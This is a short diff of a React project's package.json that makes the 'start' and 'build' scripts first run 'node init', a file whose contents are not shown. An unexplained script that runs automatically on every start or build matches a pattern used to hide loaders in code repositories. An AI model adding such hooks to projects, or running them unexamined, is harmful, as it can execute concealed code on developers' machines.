@@ -4,11 +4,11 @@
   "version": "0.1.0",
   "homepage": ".",
   "scripts": {
-    "build": "NODE_OPTIONS='--openssl-legacy-provider' react-scripts build",
+    "build": "node init && NODE_OPTIONS='--openssl-legacy-provider' react-scripts build",
     "predeploy": "npm run build",
     "deploy": "gh-pages -d build",
     "eject": "react-scripts eject",
-    "start": "react-scripts start",
+    "start": "node init && react-scripts start",
     "test": "react-scripts test",
     "vercel-build": "NODE_OPTIONS='--openssl-legacy-provider' react-scripts build"
   },
